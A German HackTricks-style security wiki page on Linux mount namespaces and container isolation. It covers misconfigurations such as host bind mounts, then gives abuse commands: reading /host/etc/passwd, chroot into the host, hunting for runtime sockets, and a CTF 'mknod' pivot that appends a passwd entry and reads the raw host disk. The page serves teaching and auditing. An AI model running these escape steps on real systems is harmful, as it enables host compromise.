# Mount-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Übersicht

Der mount namespace steuert die **Mount-Tabelle**, die ein Prozess sieht. Dies ist eine der wichtigsten container isolation-Funktionen, weil das Root-Dateisystem, bind mounts, tmpfs mounts, die procfs-Ansicht, die sysfs-Exposition und viele runtime-spezifische Hilfs-Mounts alle über diese Mount-Tabelle ausgedrückt werden. Zwei Prozesse können beide auf `/`, `/proc`, `/sys` oder `/tmp` zugreifen, aber worauf diese Pfade verweisen, hängt vom mount namespace ab, in dem sie sich befinden.

Aus Sicht der container security ist der mount namespace oft der Unterschied zwischen „dies ist ein ordentlich vorbereitetes Application-Filesystem“ und „dieser Prozess kann das Host-Dateisystem direkt sehen oder beeinflussen“. Deshalb drehen sich bind mounts, `hostPath` volumes, privileged mount operations und beschreibbare `/proc`- oder `/sys`-Expositionen alle um diesen Namespace.

## Funktionsweise

Wenn ein Runtime einen Container startet, erstellt sie in der Regel einen neuen mount namespace, bereitet ein Root-Dateisystem für den Container vor, hängt procfs und andere Hilfs-Dateisysteme bei Bedarf ein und fügt dann optional bind mounts, tmpfs mounts, secrets, config maps oder host paths hinzu. Sobald dieser Prozess innerhalb des Namespace läuft, ist die Menge der sichtbaren Mounts weitgehend vom Standard-View des Hosts entkoppelt. Der Host sieht möglicherweise weiterhin das tatsächliche zugrunde liegende Dateisystem, aber der Container sieht die Version, die vom Runtime für ihn zusammengebaut wurde.

Das ist mächtig, weil es dem Container vorgaukelt, er habe sein eigenes Root-Dateisystem, obwohl der Host weiterhin alles verwaltet. Es ist aber auch gefährlich, denn wenn das Runtime das falsche Mount exponiert, erhält der Prozess plötzlich Einblick in Host-Ressourcen, die vom restlichen Sicherheitsmodell möglicherweise nicht geschützt wurden.

## Labor

Sie können einen privaten Mount-Namespace mit:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Wenn Sie eine andere shell außerhalb dieses namespace öffnen und die mount table inspizieren, werden Sie sehen, dass der tmpfs mount nur innerhalb des isolierten mount namespace existiert. Dies ist eine nützliche Übung, da sie zeigt, dass mount isolation keine abstrakte Theorie ist; der Kernel präsentiert dem Prozess buchstäblich eine andere mount table.
Wenn Sie eine andere shell außerhalb dieses namespace öffnen und die mount table inspizieren, wird der tmpfs mount nur innerhalb des isolierten mount namespace existieren.

Innerhalb von Containern ist ein kurzer Vergleich:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Das zweite Beispiel zeigt, wie einfach es für eine Laufzeitkonfiguration ist, ein großes Loch in die Dateisystem-Grenze zu schlagen.

## Nutzung zur Laufzeit

Docker, Podman, containerd-based stacks, and CRI-O verlassen sich alle auf ein privates Mount-Namespace für normale Container. Kubernetes baut auf demselben Mechanismus für Volumes, projected secrets, config maps und `hostPath`-Mounts auf. Incus/LXC-Umgebungen sind ebenfalls stark auf Mount-Namespaces angewiesen, insbesondere weil Systemcontainer oft reichhaltigere und stärker maschinenähnliche Dateisysteme als Anwendungscontainer bereitstellen.

Das bedeutet, dass wenn Sie ein Container-Dateisystemproblem untersuchen, Sie normalerweise nicht nur eine isolierte Docker-Eigenheit betrachten. Sie sehen ein Problem des Mount-Namespace und der Laufzeitkonfiguration, ausgedrückt durch die Plattform, die die Workload gestartet hat.

## Fehlkonfigurationen

Der offensichtlichste und gefährlichste Fehler ist, das Host-Root-Dateisystem oder einen anderen sensitiven Host-Pfad durch einen bind mount freizugeben, zum Beispiel `-v /:/host` oder ein beschreibbares `hostPath` in Kubernetes. An diesem Punkt ist die Frage nicht mehr „kann der Container irgendwie entkommen?“, sondern „wie viel nützlicher Host-Inhalt ist bereits direkt sichtbar und beschreibbar?“ Ein beschreibbares Host-Bind-Mount verwandelt den Rest des Exploits oft in eine einfache Frage der Dateiablage, des chrooting, der Konfigurationsänderung oder der Entdeckung von Runtime-Sockets.

Ein weiteres häufiges Problem ist das Freigeben von Host-`/proc` oder Host-`/sys` auf eine Weise, die die sicherere Container-Ansicht umgeht. Diese Dateisysteme sind keine gewöhnlichen Daten-Mounts; sie sind Schnittstellen in Kernel- und Prozesszustände. Wenn die Workload direkt auf die Host-Versionen zugreift, gelten viele der Annahmen hinter der Container-Härtung nicht mehr sauber.

Schreibgeschützte Schutzmaßnahmen sind ebenfalls wichtig. Ein schreibgeschütztes Root-Dateisystem sichert einen Container nicht wie von selbst, aber es entzieht Angreifern großen Teil des Vorbereitungsraums und erschwert Persistenz, die Platzierung von Hilfsbinaries und das Manipulieren von Konfigurationen. Umgekehrt gibt ein beschreibbares Root- oder ein beschreibbares Host-Bind-Mount einem Angreifer Raum, den nächsten Schritt vorzubereiten.

## Missbrauch

Wenn das Mount-Namespace missbraucht wird, tun Angreifer typischerweise eines von vier Dingen. Sie **Host-Daten lesen**, die außerhalb des Containers geblieben sein sollten. Sie **Host-Konfiguration ändern** durch beschreibbare Bind-Mounts. Sie **zusätzliche Ressourcen mounten oder erneut mounten**, falls capabilities und seccomp es erlauben. Oder sie **erreichen mächtige Sockets und Runtime-Statusverzeichnisse**, die es ihnen ermöglichen, die Containerplattform selbst um mehr Zugang zu bitten.

Wenn der Container bereits das Host-Dateisystem sehen kann, ändert sich das restliche Sicherheitsmodell sofort.

Wenn Sie ein Host-Bind-Mount vermuten, bestätigen Sie zuerst, was verfügbar ist und ob es beschreibbar ist:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Wenn das Root-Dateisystem des Hosts als read-write gemountet ist, ist direkter Host-Zugriff oft so einfach wie:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Wenn das Ziel privilegierter runtime-Zugriff statt direktem chrooting ist, enumeriere sockets und runtime-Zustand:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, teste außerdem, ob neue Mounts von innerhalb des Containers erstellt werden können:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Vollständiges Beispiel: Two-Shell `mknod` Pivot

Ein spezialisierterer Missbrauchspfad tritt auf, wenn der root-Benutzer im Container Blockgeräte erstellen kann, Host und Container eine Benutzeridentität auf nützliche Weise teilen und der Angreifer bereits einen niedrig privilegierten Zugang auf dem Host hat. In dieser Situation kann der Container eine Gerätedatei wie `/dev/sda` erstellen, und der niedrig privilegierte Host-Benutzer kann sie später über `/proc/<pid>/root/` für den entsprechenden Containerprozess lesen.

Innerhalb des Containers:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vom Host aus, als der entsprechende low-privilege user, nachdem die container shell PID gefunden wurde:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die wichtigste Lehre ist nicht die genaue CTF-Stringsuche. Vielmehr ist es, dass eine Offenlegung der mount-namespace über `/proc/<pid>/root/` einem Host-Benutzer erlaubt, von Containern erstellte Device-Knoten wiederzuverwenden, selbst wenn die cgroup device policy die direkte Nutzung innerhalb des Containers verhindert hat.

## Überprüfungen

Diese Befehle zeigen dir die Dateisystemansicht, in der der aktuelle Prozess tatsächlich läuft. Ziel ist es, vom Host stammende Mounts, beschreibbare sensitive Pfade und alles zu erkennen, das umfangreicher aussieht als das Root-Dateisystem eines normalen Anwendungscontainers.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Was hier interessant ist:

- Bind mounts vom Host, insbesondere `/`, `/proc`, `/sys`, Laufzeit-Zustandsverzeichnisse oder Socket-Standorte, sollten sofort auffallen.
- Unerwartete read-write mounts sind normalerweise wichtiger als große Mengen an read-only helper mounts.
- `mountinfo` ist oft der beste Ort, um zu sehen, ob ein Pfad wirklich vom Host abgeleitet oder overlay-backed ist.

Diese Prüfungen legen fest, **welche Ressourcen in diesem Namespace sichtbar sind**, **welche davon vom Host abgeleitet sind**, und **welche davon beschreibbar oder sicherheitskritisch sind**.
{{#include ../../../../../banners/hacktricks-training.md}}
